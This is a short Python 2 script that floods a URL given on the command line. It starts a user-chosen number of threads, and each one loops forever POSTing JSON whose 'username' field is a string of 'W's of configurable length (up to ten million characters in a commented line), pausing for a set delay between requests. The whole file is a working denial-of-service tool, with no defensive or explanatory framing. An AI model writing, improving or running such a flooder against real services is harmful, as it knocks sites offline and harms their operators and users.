import urllib2
import sys
import threading
import time
import string
import requests
import json
from multiprocessing import Process
import time

url = sys.argv[1]
thread_num = string.atoi(sys.argv[2])

#datas = {'username': 'W'*10000000}
data_num = string.atoi(sys.argv[3])
datas = {'username': 'W'*data_num}
space = string.atof(sys.argv[4])
def target():
	client = requests.session()
	headers = {'Content-type': 'application/json', 'Connection': 'keep-alive'}
	#headers = {'Content-type': 'application/json'}
	while (True):
		#result = client.get(url, headers=headers)
		result = requests.post(url, data=json.dumps(datas), headers=headers)
		time.sleep(space)
		#print result.text

if __name__ == "__main__":
	for i in range(0, thread_num):
		t = threading.Thread(target=target)
		t.start()
		#Process(target=target, args=()).start()

